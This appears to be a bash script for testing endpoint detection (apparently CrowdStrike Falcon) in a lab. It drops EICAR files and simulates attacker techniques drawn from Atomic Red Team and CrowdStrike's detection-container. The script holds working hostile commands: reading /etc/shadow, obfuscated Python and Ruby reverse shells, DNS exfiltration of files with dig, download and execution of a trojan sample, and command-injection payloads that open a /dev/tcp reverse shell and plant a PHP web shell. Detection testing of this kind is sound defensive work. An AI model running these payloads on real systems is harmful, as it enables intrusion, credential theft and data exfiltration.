#!/bin/bash
set -uxo pipefail

function header () {
  echo "===== $1 ====="
}

INFO=/var/log/lab-x-test-info.log
DEBUG=/var/log/lab-x-test-debug.log

# Create Log Files
printf '' > $INFO > $DEBUG

# Tail the info logfile as a background process so the contents of the
# info logfile are output to stdout.
tail -f $INFO &

# Set an EXIT trap to ensure your background process is
# cleaned-up when the script exits
trap "pkill -P $$" EXIT

# Redirect both stdout and stderr to write to the debug logfile
exec 1>>$DEBUG 2>>$DEBUG

# Tests

# EICAR Test
header "EICAR Tests" | tee -a $INFO
MAL_NAMES=("evil" "not-so-malware" "friendly-ish" "unholy" "foul" "naz-tea" "daemonic")
SIZE=${#MAL_NAMES[@]}
EICAR_DIR=/nothing/to/see/here
EICAR_STR='X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
sudo mkdir -p $EICAR_DIR
# Single download
header "Test #1 - Download Eicar" | tee -a $INFO
curl www.eicar.org/download/eicar.com.txt > eicar.com.txt
# Download mass dump
header "Test #2 - Mass Eicar file download" | tee -a $INFO
#for i in {1..5}; do arr_index=$(($RANDOM % $SIZE)); curl -v www.eicar.org/download/eicar.com.txt > "$EICAR_DIR/${MAL_NAMES[$arr_index]}-${i}.txt"; sleep 0.01; done
for i in {1..5}
do
    arr_index=$(($RANDOM % $SIZE))
    curl -s www.eicar.org/download/eicar.com.txt > "$EICAR_DIR/${MAL_NAMES[$arr_index]}-${i}.txt" || echo "ERROR: Could not write ${i} attempt."
    sleep 0.02
done
# Crafted mass dump
header "Test #3 - Mass Eicar file creation" | tee -a $INFO
#for i in {1..5}; do arr_index=$(($RANDOM % $SIZE)); echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > "$EICAR_DIR/${MAL_NAMES[$arr_index]}-${i}.txt"; sleep 0.02; done

for i in {1..5}
do
    arr_index=$(($RANDOM % $SIZE))
    echo $EICAR_STR > "$EICAR_DIR/${MAL_NAMES[$arr_index]}-${i}.txt" || echo "ERROR: Could not write ${i} attempt."
    sleep 0.02
done

# MITRE Reference https://attack.mitre.org/techniques/T1003/008/
# Tests from https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.008/T1003.008.md
header "T1003.008 - /etc/passwd and /etc/shadow" | tee -a $INFO
output_file=/tmp/T1003.008.txt

header "Test #1 - Access /etc/shadow (Local)" | tee -a $INFO
sudo cat /etc/shadow > $output_file
cat $output_file

header "Test #2 - Access /etc/passwd (Local)" | tee -a $INFO
cat /etc/passwd > $output_file
cat $output_file

header "Test #3 - Access /etc/{shadow,passwd} with a standard bin that's not cat" | tee -a $INFO
#sudo echo -e $(e /etc/passwd;p;e /etc/shadow;p) > $output_file

header "Test #4 - Access /etc/{shadow,passwd} with shell builtins" | tee -a $INFO
function testcat(){ echo "$(< $1)"; }
testcat /etc/passwd > $output_file
testcat /etc/shadow > $output_file

# Crowdstrike Tests
# Tests from  https://github.com/CrowdStrike/detection-container/tree/main/bin
header "Executing Collection via Automated Collection script. Trying to dump information from etc/passwd" | tee -a $INFO
sudo sh -c "/bin/grep 'x:0:' /etc/passwd > /tmp/passwords"

header "Executing Command and Control via Remote Access Tools using obfuscated Python script. A Falcon Prevent action can kill the attempt" | tee -a $INFO
sudo python -c 'import base64;dec=base64.b64decode("aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE3Mi4xNy4wLjIxIiw1NTU1KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItIl0pOw==");eval(compile(dec,"<string>","exec"))'
sudo python3 -c 'import base64;dec=base64.b64decode("aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE3Mi4xNy4wLjIxIiw1NTU1KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItIl0pOw==");eval(compile(dec,"<string>","exec"))'

header "Executing Command and Control via Remote Access Tools using Ruby script. This script will try to connect to 192.168.1.222 and will exit at fork. A Falcon Prevent action can kill the attempt" | tee -a $INFO
sudo ruby -rsocket -e'exit if fork;s=TCPSocket.new("192.168.1.222",4444);loop do;cmd=gets.chomp;s.puts cmd;s.close if cmd=="exit";puts s.recv(1000000);end'

header "Executing Container Drift via file creation script. Creating a file and then executing it." | tee -a $INFO
sudo sh -c "rm -f /bin/id2 ; cp /bin/id /bin/id2; /bin/id2 > /dev/null"

header "Executing Defense Evasion via Masquerading. This script excutes a renamed copy of /usr/bin/whoami causing a contradicting file extension" | tee -a $INFO
sudo cp /usr/bin/whoami ./whoami.rtf
sudo ./whoami.rtf

header "Executing Defense Evasion via Rootkit.This script will change the group owner to '0' of /etc/ld.so.preload indicative for a Jynx Rootkit" | tee -a $INFO
sudo touch /etc/ld.so.preload
sudo chgrp 0 /etc/ld.so.preload

header "Executing Execution via Command-Line Interface. This script is causing malicious activity related suspicious CLI commands" | tee -a $INFO
sudo sh -c whoami '[S];pwd;echo [E]'

header "Executing Exfiltration Over Alternative Protocol using a DNS tool sendng requests to large domain names. This will take a moment to execute..." | tee -a $INFO
sudo cd /tmp
sudo touch {1..7}.tmp
sudo zip -qm - *tmp|xxd -p >data
for dat in `cat data `; do sudo dig $dat.legit.term01-b-449152202.us-west-1.elb.amazonaws.com; done > /dev/null 2>&1
sudo rm data

header "Executing Persistence via External Remote Services via Python script. This script will try creating presistance to 192.168.1.222. A Falcon Prevent action can kill the attempt" | tee -a $INFO
sudo python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.17.0.21",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-"]);'

header "Executing an inert trojan that will attempt to connect to 192.168.0.1 on TCP port 444. This will be detected and killed by CrowdStrike's on-sensor machine learning with the aggressive policy settings enabled." | tee -a $INFO
sudo curl -s --location --request GET 'https://github.com/CrowdStrike/detection-container/blob/main/bin/evil/sample?raw=true' -o /var/lib/tests/evil/sample --create-dirs
exec sudo ./var/lib/tests/evil/sample

header "Executing Command Injection to execute reverse shell." | tee -a $INFO
sudo curl -X POST -d "ip=1.1.1.1+%26%26+bash+-i+%3E%26+%2Fdev%2Ftcp%2F172.17.0.21%2F1111+0%3E%261&Submit=Submit" http://localhost/low.php

header "Executing Command Injection to Spawn a Suspicious Terminal. This script excutes a command injection, which writes a file to http://webserver/uploads/test.php, then executes that script" | tee -a $INFO
sudo curl -X POST -d "ip=1.1.1.1+%26%26+echo+%27%3C%3Fphp+shell_exec%28%22whoami%22%29%3B+%3F%3E%27+%3E+uploads%2Ftest.php&Submit=Submit" http://localhost/low.php
sudo curl http://localhost/uploads/test.php

header "Executing Command Injection to dump MySQL Server tables." | tee -a $INFO
curl -X POST -d "ip=1.1.1.1+%26%26+mysqldump+-u&Submit=Submit" http://localhost/low.php

header "Cleanup of $output_file" | tee -a $INFO
sudo rm -f $output_file
